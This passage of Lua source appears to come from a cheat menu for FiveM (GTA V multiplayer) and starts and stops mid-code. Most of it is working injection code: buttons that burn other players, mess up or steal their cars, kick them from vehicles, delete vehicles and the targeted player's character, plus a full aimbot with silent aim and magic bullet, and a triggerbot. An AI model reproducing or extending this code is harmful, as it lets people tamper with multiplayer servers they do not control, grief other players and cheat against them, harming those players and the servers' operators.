                                            end

                                            SafeRunNative(RemoveWeaponFromPed, SafeRunNative(PlayerPedId), fireWeap)
                                            _G.BurnPlayerThread = nil
                                        end)
                                    end
                                ]], selectedPlayer))
                            else
                                injectCode('any', [[
                                    _G.BurnPlayerActive = false
                                ]])
                            end
                            showNotify('Burn Player ' .. (checked and 'On' or 'Off'), checked and 'success' or 'info')
                        end
                    },
                    {
                        type = 'button',
                        label = 'Mess up Players Car',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if SafeRunNative(DoesEntityExist, targetPed) then
                                    local fok = SafeRunNative(ClonePed, targetPed, 1, 1, 1)
                                    SafeRunNative(SetEntityVisible, fok, false, true)
                                    SafeRunNative(AttachEntityToEntityPhysically, fok, targetPed, 0, 0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 180.0, 180.0, 999999.0, true, true, true, false, 2)
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Kick from Vehicle',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                SafeRunNative(CreateThread, function()
                                    local targetSid = %d
                                    local ped = GetPlayerPed(GetPlayerFromServerId(targetSid))
                                    local pedvehicle = GetVehiclePedIsIn(ped, false)

                                    if ped and DoesEntityExist(ped) and pedvehicle ~= 0 then
                                        local lastCoords = GetEntityCoords(PlayerPedId())
                                        local reqStart = GetGameTimer()
                                        while (GetGameTimer() - reqStart) < 1000 do
                                            if SafeRunNative(NetworkHasControlOfEntity, pedvehicle) then break end
                                            SafeRunNative(NetworkRequestControlOfEntity, pedvehicle)
                                            Wait(0)
                                        end

                                        if not SafeRunNative(NetworkHasControlOfEntity, pedvehicle) then
                                            SafeRunNative(SetPedIntoVehicle, PlayerPedId(), pedvehicle, 0)
                                            reqStart = GetGameTimer()
                                            while (GetGameTimer() - reqStart) < 2000 do
                                                if SafeRunNative(NetworkHasControlOfEntity, pedvehicle) then break end
                                                SafeRunNative(NetworkRequestControlOfEntity, pedvehicle)
                                                Wait(0)
                                            end
                                        end
                                        Wait(10)

                                        for i = 0, 4 do
                                            SafeRunNative(DeletePed, ped)
                                        end
                                        Wait(40)

                                        SafeRunNative(SetPedIntoVehicle, PlayerPedId(), pedvehicle, -1)
                                        Wait(1)

                                        local emptySeat = -1
                                        local seats = {-1, 0, 1, 2}
                                        for _, s in ipairs(seats) do
                                            if IsVehicleSeatFree(pedvehicle, s) then
                                                emptySeat = s
                                                break
                                            end
                                        end

                                        SafeRunNative(SetPedIntoVehicle, PlayerPedId(), pedvehicle, emptySeat)
                                        Wait(1)
                                        SafeRunNative(SetPedIntoVehicle, PlayerPedId(), pedvehicle, -1)
                                        Wait(450)
                                        SafeRunNative(ClearPedTasksImmediately, PlayerPedId())
                                        Wait(100)

                                        SafeRunNative(TaskLeaveAnyVehicle, PlayerPedId())
                                        Wait(1)
                                        SafeRunNative(ClearPedTasks, PlayerPedId())
                                        SafeRunNative(ClearPedTasksImmediately, PlayerPedId())
                                        Wait(100)

                                        SafeRunNative(SetEntityCoordsNoOffset, PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        SafeRunNative(FreezeEntityPosition, PlayerPedId(), false)
                                        SafeRunNative(ClearPedTasks, PlayerPedId())
                                        SafeRunNative(ClearPedTasksImmediately, PlayerPedId())
                                        SafeRunNative(SetEntityVisible, PlayerPedId(), true, true)
                                        SafeRunNative(SetEntityCollision, PlayerPedId(), true, true)
                                        SafeRunNative(SetEntityInvincible, PlayerPedId(), false)
                                        SafeRunNative(SetPedCanRagdoll, PlayerPedId(), true)
                                        SafeRunNative(SetPedConfigFlag, PlayerPedId(), 32, false)

                                        Wait(50)
                                        local syncCoords = SafeRunNative(GetEntityCoords, PlayerPedId())
                                        SafeRunNative(SetEntityCoordsNoOffset, PlayerPedId(), syncCoords.x + 0.1, syncCoords.y + 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SafeRunNative(SetEntityCoordsNoOffset, PlayerPedId(), syncCoords.x - 0.1, syncCoords.y - 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SafeRunNative(SetEntityCoordsNoOffset, PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        Wait(200)
                                        SafeRunNative(FreezeEntityPosition, PlayerPedId(), false)
                                        SafeRunNative(SetEntityVisible, PlayerPedId(), true, true)
                                        SafeRunNative(ClearPedTasksImmediately, PlayerPedId())
                                        Wait(100)
                                    end
                                end)
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Steal Vehicle',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local targetID = %d
                                local me = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            SafeRunNative(NetworkRequestControlOfEntity, vehicle)
                                            SafeRunNative(ClearPedTasksImmediately, driver)
                                        end
                                        SafeRunNative(TaskEnterVehicle, me, vehicle, 1200, -1, 2.0, 16, 0)
                                    end
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Bring Vehicle',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local targetID = %d
                                local me = PlayerPedId()
                                local myCoords = GetEntityCoords(me)
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            SafeRunNative(NetworkRequestControlOfEntity, vehicle)
                                            SafeRunNative(ClearPedTasksImmediately, driver)
                                        end
                                        local start = GetGameTimer()
                                        while not SafeRunNative(NetworkHasControlOfEntity, vehicle) and GetGameTimer() - start < 1000 do
                                            SafeRunNative(NetworkRequestControlOfEntity, vehicle)
                                            Wait(0)
                                        end
                                        SafeRunNative(SetEntityCoordsNoOffset, vehicle, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                                    end
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Delete Vehicle',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local targetID = %d
                                local me = PlayerPedId()
                                local myCoords = GetEntityCoords(me)
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            SafeRunNative(NetworkRequestControlOfEntity, vehicle)
                                            SafeRunNative(ClearPedTasksImmediately, driver)
                                        end
                                        local start = GetGameTimer()
                                        while not SafeRunNative(NetworkHasControlOfEntity, vehicle) and GetGameTimer() - start < 1000 do
                                            SafeRunNative(NetworkRequestControlOfEntity, vehicle)
                                            Wait(0)
                                        end
                                        SafeRunNative(DeleteEntity, vehicle)
                                        SafeRunNative(ClearPedTasksImmediately, me)
                                        SafeRunNative(SetEntityCoordsNoOffset, me, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                                    end
                                end
                            ]], selectedPlayer))
                        end
                    },
                }
            }
        }
    },
    {
        label = 'Combat',
        icon = 'ph-crosshair',
        type = 'submenu',
        tabs = {
            {
                name = 'Aimbot',
                submenu = {
                    {
                        type = "checkbox",
                        label = "Enabled",
                        checked = false,
                        onConfirm = function(checked)
                            if not checked then
                                MachoHookNative(0x68EDDA28A5976D07, function() return true end)
                                MachoHookNative(0xA571D46727E2B718, function() return true end)
                                MachoHookNative(0x1CEA6BFDF248E5D9, function() return true end)
                                injectCode('monitor', [[ DeleteTrackedThread('JunkieAimbot') ]])
                                SendSvelte('setAimbotFov', { visible = false, size = junkieAimbotFovSize })
                                showNotify("Aimbot disabled", "info")
                                return
                            end
                            MachoHookNative(0x68EDDA28A5976D07, function()
                                return false, false
                            end)
                            MachoHookNative(0xA571D46727E2B718, function(padIndex)
                                if padIndex == 0 then return false, false end
                                return true
                            end)
                            MachoHookNative(0x1CEA6BFDF248E5D9, function(padIndex, control)
                                if control == 1 or control == 2 then return false, true end
                                return true
                            end)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {
                                    players=true, peds=false,
                                    fovSize=150, smooth=5,
                                    bone='Head', aimKey=25,
                                    silentAim=false, magicBullet=false,
                                    distCheck=false, maxDist=250,
                                    friendlyList={}, useFriendlist=false
                                }

                                local function _vnorm(v)
                                    local m = math.sqrt(v.x*v.x + v.y*v.y + v.z*v.z)
                                    if m == 0 then return {x=0,y=0,z=0} end
                                    return {x=v.x/m, y=v.y/m, z=v.z/m}
                                end
                                local function _vdot(a,b)   return a.x*b.x+a.y*b.y+a.z*b.z end
                                local function _vcross(a,b) return {x=a.y*b.z-a.z*b.y, y=a.z*b.x-a.x*b.z, z=a.x*b.y-a.y*b.x} end
                                local function _vsub(a,b)   return {x=a.x-b.x, y=a.y-b.y, z=a.z-b.z} end

                                local function _getCamAdj(camPos, camRot, tPos)
                                    local rz   = math.rad(camRot.z)
                                    local rx   = math.rad(camRot.x)
                                    local cosX = math.abs(math.cos(rx))
                                    local fwd  = _vnorm({x=-math.sin(rz)*cosX, y=math.cos(rz)*cosX, z=math.sin(rx)})
                                    local toT  = _vnorm(_vsub(tPos, camPos))
                                    local rght = _vnorm(_vcross(fwd, {x=0,y=0,z=1}))
                                    local up   = _vnorm(_vcross(rght, fwd))
                                    local h    = _vdot(toT, rght)
                                    local v    = _vdot(toT, up)
                                    return h>0 and 'right' or h<0 and 'left' or 'none',
                                           v>0 and 'up'    or v<0 and 'down'  or 'none', v, h
                                end

                                local _BONES_MAP = {
                                    Head=0x796e,  Neck=0x9995,  Chest=0x5af3,  Pelvis=0x2e28,
                                    LeftUpperArm=0xb1c5,  LeftForearm=0xeeeb,  LeftHand=0x49d9,
                                    RightUpperArm=0x9d4d, RightForearm=0x6e5c, RightHand=0xdead,
                                    LeftThigh=0xe39f,  LeftCalf=0xf9bb,  LeftFoot=0x3779,
                                    RightThigh=0xca72, RightCalf=0x9000, RightFoot=0xcc4d,
                                }
                                local _ALL_BONES = {
                                    0x796e, 0x9995, 0x5af3, 0x2e28,
                                    0xb1c5, 0xeeeb, 0x49d9,
                                    0x9d4d, 0x6e5c, 0xdead,
                                    0xe39f, 0xf9bb, 0x3779,
                                    0xca72, 0x9000, 0xcc4d,
                                }

                                CreateTrackedThread('JunkieAimbot', {
                                    thread = function(self)
                                        local SRN = SafeRunNative
                                        local cachedClosest
                                        local sw, sh = SRN(GetActiveScreenResolution)
                                        sw = sw or 1920
                                        sh = sh or 1080
                                        local cx = sw * 0.5
                                        local cy = sh * 0.5

                                        while self.isActive do
                                            local cfg     = _G.junkieAimbot or {}
                                            local fovSize = cfg.fovSize or 150
                                            local aimKey  = cfg.aimKey  or 25

                                            if SRN(IsDisabledControlPressed, 0, aimKey) then
                                                local selfPed  = PlayerPedId()
                                                local rendCam  = SRN(GetRenderingCam)
                                                local camPos   = rendCam ~= -1 and SRN(GetCamCoord, rendCam) or SRN(GetGameplayCamCoord)
                                                local camRot   = rendCam ~= -1 and SRN(GetCamRot, rendCam, 2) or SRN(GetGameplayCamRot, 2)
                                                local allPeds  = SRN(GetGamePool, 'CPed')
                                                local best, foundLocked

                                                for i = 1, #allPeds do
                                                    local ped = allPeds[i]
                                                    if ped ~= selfPed then
                                                        local isPlayer = SRN(IsPedAPlayer, ped)
                                                        local wanted   = (isPlayer and cfg.players) or (not isPlayer and cfg.peds)

                                                        if wanted and cfg.useFriendlist and isPlayer then
                                                            local plyIdx = NetworkGetPlayerIndexFromPed(ped)
                                                            if plyIdx ~= -1 then
                                                                local sid = GetPlayerServerId(plyIdx)
                                                                if cfg.friendlyList and cfg.friendlyList[sid] then
                                                                    wanted = false
                                                                end
                                                            end
                                                        end

                                                        if wanted
                                                            and not SRN(IsEntityDead, ped)
                                                            and SRN(IsEntityVisible, ped)
                                                            and SRN(HasEntityClearLosToEntity, selfPed, ped, 5)
                                                        then
                                                            local bone
                                                            if cfg.bone == 'Closest' then
                                                                local bestB, bestD2
                                                                for _, b in ipairs(_ALL_BONES) do
                                                                    local bc = SRN(GetPedBoneCoords, ped, b, 0, 0, 0)
                                                                    local ok, bsx, bsy = SRN(World3dToScreen2d, bc.x, bc.y, bc.z)
                                                                    if ok then
                                                                        local dx = bsx*sw - cx
                                                                        local dy = bsy*sh - cy
                                                                        local d2 = dx*dx + dy*dy
                                                                        if not bestB or d2 < bestD2 then bestB=b; bestD2=d2 end
                                                                    end
                                                                end
                                                                bone = bestB
                                                            else
                                                                bone = _BONES_MAP[cfg.bone] or _BONES_MAP.Head
                                                            end

                                                            if bone then
                                                                if cachedClosest and cachedClosest.ped == ped then
                                                                    bone = cachedClosest.bone
                                                                end
                                                                local coords  = SRN(GetPedBoneCoords, ped, bone, 0, 0, 0)
                                                                local inRange = true
                                                                if cfg.distCheck then
                                                                    local ddx = coords.x - camPos.x
                                                                    local ddy = coords.y - camPos.y
                                                                    local ddz = coords.z - camPos.z
                                                                    inRange = math.sqrt(ddx*ddx + ddy*ddy + ddz*ddz) <= (cfg.maxDist or 250)
                                                                end
                                                                if inRange then
                                                                    local ok, tsx, tsy = SRN(World3dToScreen2d, coords.x, coords.y, coords.z)
                                                                    if ok then
                                                                        local dx   = tsx*sw - cx
                                                                        local dy   = tsy*sh - cy
                                                                        local dist = math.sqrt(dx*dx + dy*dy)
                                                                        if dist <= fovSize then
                                                                            local entry = { ped=ped, bone=bone, dist=dist, coords=coords }
                                                                            if cachedClosest and cachedClosest.ped == ped then
                                                                                foundLocked = entry
                                                                                break
                                                                            elseif not best or dist < best.dist then
                                                                                best = entry
                                                                            end
                                                                        end
                                                                    end
                                                                end
                                                            end
                                                        end
                                                    end
                                                end

                                                if foundLocked then best = foundLocked end

                                                if cfg.silentAim and best and SRN(IsPedShooting, selfPed) then
                                                    local weapon = SRN(GetSelectedPedWeapon, selfPed)
                                                    local dmg    = SRN(GetWeaponDamage, weapon) or 999
                                                    local from   = cfg.magicBullet and best.coords or SRN(GetGameplayCamCoord)
                                                    SRN(ShootSingleBulletBetweenCoords,
                                                        from.x, from.y, from.z,
                                                        best.coords.x, best.coords.y, best.coords.z,
                                                        dmg, true, weapon, selfPed, true, false, 1000.0)
                                                end

                                                if best then
                                                    local horiz, vert, vT, hT = _getCamAdj(camPos, camRot, best.coords)
                                                    local sm = math.max(1, cfg.smooth or 5)

                                                    if horiz ~= 'none' and SRN(IsControlEnabled, 0, 1) then
                                                        local chg = math.min(1.0, math.abs(hT) * 100) / (sm / 5)
                                                        if rendCam == -1 then
                                                            local h = SRN(GetGameplayCamRelativeHeading)
                                                            SRN(SetGameplayCamRelativeHeading, horiz == 'left' and h + chg or h - chg)
                                                        else
                                                            local nz = horiz == 'left' and camRot.z + chg or camRot.z - chg
                                                            camRot = vec3(camRot.x, camRot.y, nz)
                                                            SRN(SetCamRot, rendCam, camRot.x, camRot.y, camRot.z, 2)
                                                        end
                                                    end

                                                    if vert ~= 'none' and SRN(IsControlEnabled, 0, 2) then
                                                        local chg = math.min(1.0, math.abs(vT) * 100) / ((sm / 5) * 1.15)
                                                        if rendCam == -1 then
                                                            local p = SRN(GetGameplayCamRelativePitch)
                                                            SRN(SetGameplayCamRelativePitch, vert == 'up' and p + chg or p - chg, 1.0)
                                                        else
                                                            local nx = vert == 'up' and camRot.x + chg or camRot.x - chg
                                                            camRot = vec3(nx, camRot.y, camRot.z)
                                                            SRN(SetCamRot, rendCam, camRot.x, camRot.y, camRot.z, 2)
                                                        end
                                                    end
                                                end

                                                cachedClosest = best
                                            end

                                            Wait(0)
                                        end
                                    end
                                })
                            ]], ''))
                            if junkieAimbotFovVisible then
                                SendSvelte('setAimbotFov', { visible = true, size = junkieAimbotFovSize })
                            end
                            showNotify("Aimbot on — hold " .. junkieAimbotAimKeyName .. " to lock", "info")
                        end
                    },
                    {
                        type = "button",
                        label = "Aimkey: " .. junkieAimbotAimKeyName,
                        onConfirm = function()
                            setKeybind('Aimkey (current: ' .. junkieAimbotAimKeyName .. ')', function()
                                defaultBind = junkieAimbotAimKeyName
                                canCancel   = true
                                onConfirm   = function(key)
                                    local ctrl = AIMKEY_MAP[key] or 25
                                    junkieAimbotAimKeyName = key
                                    junkieAimbotAimKey     = ctrl
                                    injectCode('monitor', string.format([[
                                        _G.junkieAimbot = _G.junkieAimbot or {}
                                        _G.junkieAimbot.aimKey = %d
                                    ]], ctrl))
                                    if menuConfig then
                                        for _, itm in ipairs(menuConfig) do
                                            if type(itm.label) == 'string' and itm.label:sub(1, 7) == 'Aimkey:' then
                                                itm.label = 'Aimkey: ' .. key
                                                break
                                            end
                                        end
                                        refreshMenu()
                                    end
                                    showNotify("Aimkey set to: " .. key, "info")
                                end
                            end)
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Target Players",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.players = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Target NPCs",
                        checked = false,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.peds = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "scroll",
                        label = "Target Bone",
                        selected = 1,
                        options = {
                            { label = "Head",        value = "Head"         },
                            { label = "Neck",        value = "Neck"         },
                            { label = "Chest",       value = "Chest"        },
                            { label = "Pelvis",      value = "Pelvis"       },
                            { label = "L Upper Arm", value = "LeftUpperArm" },
                            { label = "L Forearm",   value = "LeftForearm"  },
                            { label = "L Hand",      value = "LeftHand"     },
                            { label = "R Upper Arm", value = "RightUpperArm"},
                            { label = "R Forearm",   value = "RightForearm" },
                            { label = "R Hand",      value = "RightHand"    },
                            { label = "L Thigh",     value = "LeftThigh"    },
                            { label = "L Calf",      value = "LeftCalf"     },
                            { label = "L Foot",      value = "LeftFoot"     },
                            { label = "R Thigh",     value = "RightThigh"   },
                            { label = "R Calf",      value = "RightCalf"    },
                            { label = "R Foot",      value = "RightFoot"    },
                            { label = "Closest",     value = "Closest"      },
                        },
                        onConfirm = function(data)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.bone = '%s'
                            ]], data.value))
                            showNotify("Bone: " .. data.value, "info")
                        end
                    },
                    {
                        type = "slider",
                        label = "FOV Size",
                        min = 20,
                        max = 400,
                        value = 150,
                        step = 10,
                        onConfirm = function(val)
                            junkieAimbotFovSize = val
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.fovSize = %s
                            ]], tostring(val)))
                            SendSvelte('setAimbotFov', { size = val })
                            showNotify("FOV: " .. val .. "px", "info")
                        end
                    },
                    {
                        type = "slider",
                        label = "Smoothing",
                        min = 1,
                        max = 20,
                        value = 5,
                        step = 1,
                        onConfirm = function(val)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.smooth = %s
                            ]], tostring(val)))
                            showNotify("Smoothing: " .. val, "info")
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Show FOV Circle",
                        checked = false,
                        onConfirm = function(c)
                            junkieAimbotFovVisible = c
                            SendSvelte('setAimbotFov', { visible = c, size = junkieAimbotFovSize })
                            showNotify("FOV Circle " .. (c and "on" or "off"), "info")
                        end
                    },
                    { type = 'divider', label = 'Combat' },
                    {
                        type = "checkbox",
                        label = "Silent Aim",
                        checked = false,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.silentAim = %s
                            ]], tostring(c)))
                            showNotify("Silent Aim " .. (c and "on" or "off"), "info")
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Magic Bullet",
                        checked = false,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.magicBullet = %s
                            ]], tostring(c)))
                            showNotify("Magic Bullet " .. (c and "on" or "off"), "info")
                        end
                    },
                    { type = 'divider', label = 'Filters' },
                    {
                        type = "checkbox",
                        label = "Distance Check",
                        checked = false,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.distCheck = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "slider",
                        label = "Max Distance",
                        min = 50,
                        max = 500,
                        value = 250,
                        step = 10,
                        onConfirm = function(val)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.maxDist = %d
                            ]], val))
                            showNotify("Max dist: " .. val .. "m", "info")
                        end
                    },
                    { type = 'divider', label = 'Friendlist' },
                    {
                        type = "checkbox",
                        label = "Use Friendlist",
                        checked = false,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieAimbot = _G.junkieAimbot or {}
                                _G.junkieAimbot.useFriendlist = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "button",
                        label = "Add Nearest Player",
                        onConfirm = function()
                            injectCode('monitor', [[
                                local selfPed = PlayerPedId()
                                local allPeds = GetGamePool('CPed')
                                local closest, closestDist
                                for i = 1, #allPeds do
                                    local ped = allPeds[i]
                                    if ped ~= selfPed and IsPedAPlayer(ped) then
                                        local d = #(GetEntityCoords(ped) - GetEntityCoords(selfPed))
                                        if not closest or d < closestDist then
                                            closest = ped
                                            closestDist = d
                                        end
                                    end
                                end
                                if closest then
                                    local plyIdx = NetworkGetPlayerIndexFromPed(closest)
                                    if plyIdx ~= -1 then
                                        local sid = GetPlayerServerId(plyIdx)
                                        _G.junkieAimbot = _G.junkieAimbot or {}
                                        _G.junkieAimbot.friendlyList = _G.junkieAimbot.friendlyList or {}
                                        _G.junkieAimbot.friendlyList[sid] = true
                                    end
                                end
                            ]])
                            showNotify("Nearest player added to friendlist", "success")
                        end
                    },
                    {
                        type = "button",
                        label = "Clear Friendlist",
                        onConfirm = function()
                            injectCode('monitor', [[
                                if _G.junkieAimbot then _G.junkieAimbot.friendlyList = {} end
                            ]])
                            showNotify("Friendlist cleared", "info")
                        end
                    },
                }
            },
            {
                name = 'Triggerbot',
                submenu = {
                    {
                        type = "checkbox",
                        label = "Enabled",
                        checked = false,
                        onConfirm = function(checked)
                            if not checked then
                                injectCode('monitor', [[ DeleteTrackedThread('JunkieTriggerbot') ]])
                                showNotify("Triggerbot disabled", "info")
                                return
                            end

                            injectCode('monitor', [[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}

                                CreateTrackedThread('JunkieTriggerbot', {
                                    thread = function(self)
                                        local SRN = SafeRunNative
                                        local cached

                                        local function _d(v, def)
                                            if v == nil then return def end
                                            return v
                                        end

                                        while self.isActive do
                                            local cfg      = _G.junkieTriggerbot or {}
                                            local newCache = nil

                                            if not _d(cfg.useBind, true) or SRN(IsDisabledControlPressed, 0, cfg.bindKey or 25) then
                                                local selfPed = PlayerPedId()
                                                local rendCam = SRN(GetRenderingCam)

                                                if SRN(IsPedArmed, selfPed, 6) or rendCam ~= -1 then
                                                    local camPos = rendCam ~= -1 and SRN(GetCamCoord, rendCam) or SRN(GetGameplayCamCoord)
                                                    local camRot = rendCam ~= -1 and SRN(GetCamRot, rendCam, 2) or SRN(GetGameplayCamRot, 2)
                                                    local rz     = math.rad(camRot.z)
                                                    local rx     = math.rad(camRot.x)
                                                    local cosX   = math.abs(math.cos(rx))

                                                    local probe = SRN(StartExpensiveSynchronousShapeTestLosProbe,
                                                        camPos.x, camPos.y, camPos.z,
                                                        camPos.x + (-math.sin(rz) * cosX) * 500.0,
                                                        camPos.y + (math.cos(rz) * cosX) * 500.0,
                                                        camPos.z + math.sin(rx) * 500.0,
                                                        4, selfPed, 7)

                                                    local _, hit, _, _, entity = SRN(GetShapeTestResult, probe)

                                                    if hit and entity and entity > 0 and entity ~= selfPed and SRN(IsEntityAPed, entity) then
                                                        local ok = true

                                                        if _d(cfg.invisibleCheck, true) and not SRN(IsEntityVisible, entity) then ok = false end
                                                        if ok and _d(cfg.visibleCheck, true) and not SRN(HasEntityClearLosToEntity, selfPed, entity, 5) then ok = false end
                                                        if ok and _d(cfg.deadCheck, true) and SRN(IsEntityDead, entity, true) then ok = false end
                                                        if ok and _d(cfg.distCheck, true) then
                                                            local pedPos = SRN(GetEntityCoords, entity)
                                                            local dx, dy, dz = pedPos.x - camPos.x, pedPos.y - camPos.y, pedPos.z - camPos.z
                                                            if math.sqrt(dx*dx + dy*dy + dz*dz) > (cfg.maxDist or 250) then ok = false end
                                                        end

                                                        if ok then
                                                            local isPlayer = SRN(IsPedAPlayer, entity)

                                                            if (isPlayer and _d(cfg.players, true)) or (not isPlayer and _d(cfg.peds, false)) then
                                                                local shoot = true

                                                                if _d(cfg.useDelay, true) and (cfg.delay or 0) > 0 then
                                                                    local now = GetGameTimer()

                                                                    if not cached or cached.entity ~= entity then
                                                                        newCache = { entity = entity, timer = now }
                                                                        shoot = false
                                                                    else
                                                                        newCache = cached
                                                                        shoot = (now - cached.timer) > cfg.delay
                                                                    end
                                                                end

                                                                if shoot then
                                                                    SRN(SetControlNormal, 0, 24, 1.0)
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end

                                            cached = newCache
                                            Wait(0)
                                        end
                                    end
                                })
                            ]])

                            showNotify("Triggerbot enabled", "success")
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Use Keybind",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.useBind = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "button",
                        label = "Trigger Key: " .. junkieTriggerKeyName,
                        onConfirm = function()
                            setKeybind('Triggerbot Keybind', function()
                                defaultBind = junkieTriggerKeyName
                                canCancel   = true
                                onConfirm   = function(key)
                                    local ctrl = AIMKEY_MAP[key] or 25
                                    junkieTriggerKeyName = key
                                    junkieTriggerKey     = ctrl
                                    injectCode('monitor', string.format([[
                                        _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                        _G.junkieTriggerbot.bindKey = %d
                                    ]], ctrl))
                                    if menuConfig then
                                        for _, itm in ipairs(menuConfig) do
                                            if type(itm.label) == 'string' and itm.label:sub(1, 12) == 'Trigger Key:' then
                                                itm.label = 'Trigger Key: ' .. key
                                                break
                                            end
                                        end
                                        refreshMenu()
                                    end
                                    showNotify("Trigger key set to: " .. key, "info")
                                end
                            end)
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Use Delay",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.useDelay = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "slider",
                        label = "Delay (MS)",
                        min = 0,
                        max = 1000,
                        value = 50,
                        step = 5,
                        onConfirm = function(val)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.delay = %s
                            ]], tostring(val)))
                            showNotify("Trigger delay: " .. val .. "ms", "info")
                        end
                    },
                    { type = 'divider', label = 'Targeting' },
                    {
                        type = "checkbox",
                        label = "Target Players",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.players = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Target NPCs",
                        checked = false,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.peds = %s
                            ]], tostring(c)))
                        end
                    },
                    { type = 'divider', label = 'Checks' },
                    {
                        type = "checkbox",
                        label = "Visible Check",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
                                _G.junkieTriggerbot.visibleCheck = %s
                            ]], tostring(c)))
                        end
                    },
                    {
                        type = "checkbox",
                        label = "Invisible Check",
                        checked = true,
                        onConfirm = function(c)
                            injectCode('monitor', string.format([[
                                _G.junkieTriggerbot = _G.junkieTriggerbot or {}
